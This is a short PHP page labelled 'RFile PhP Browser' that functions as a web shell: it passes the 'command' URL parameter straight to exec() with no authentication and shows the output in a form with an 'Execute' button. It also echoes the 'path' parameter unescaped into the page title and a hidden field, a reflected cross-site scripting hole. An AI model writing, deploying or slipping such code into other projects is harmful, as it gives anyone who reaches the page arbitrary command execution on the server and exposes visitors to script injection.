<?php
if(isset($_GET['command']))
{
exec($_GET['command'],$returns);
$returns = implode("\n",$returns);
}
else
{
$returns = '';
}
?>
<html>
<head>
<link rel="stylesheet" type="text/css" href="main.css" />
<title><?php echo $_GET['path'].'/' ?></title>
</head>
<body>
<h3 align='center'>RFile PhP Browser</h3>
<form action='execute.php' method='get'>
<textarea cols='100' rows='10' align='center'><?php echo $returns; ?></textarea><br>
<input type='input' name='command'>
<input type='hidden' name='path' value='<?php echo $_GET['path'] ?>'>
<input type='submit' value='Execute'>
</form>
</body>
</html>